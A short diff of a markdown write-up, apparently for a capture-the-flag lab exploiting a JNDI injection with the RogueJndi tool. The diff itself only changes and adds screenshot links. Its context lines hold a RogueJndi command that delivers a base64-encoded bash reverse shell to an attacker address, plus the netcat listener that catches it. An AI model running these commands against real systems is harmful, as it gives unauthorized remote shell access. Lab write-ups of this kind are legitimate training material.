@@ -87,7 +87,7 @@ java -jar RogueJndi-1.1.jar --command 'whoami' --hostname 10.10.16.34
 tcpdump -i tun0 port 389 -v
 ```
 
-![](/img2/Pasted%20image%2020250319111549.png)
+![](/img2/Pasted%20image%2020250319161543.png)
 
 - Send reverse shell in base64
 
@@ -98,6 +98,8 @@ echo "bash -i >& /dev/tcp/10.10.16.34/9000 0>&1"|base64
 ```bash
 java -jar RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMzQvOTAwMCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname 10.10.16.34
 ```
+
+![](/img2/Pasted%20image%2020250319161543.png)
 
 ```bash
 nc -nlvp 9000
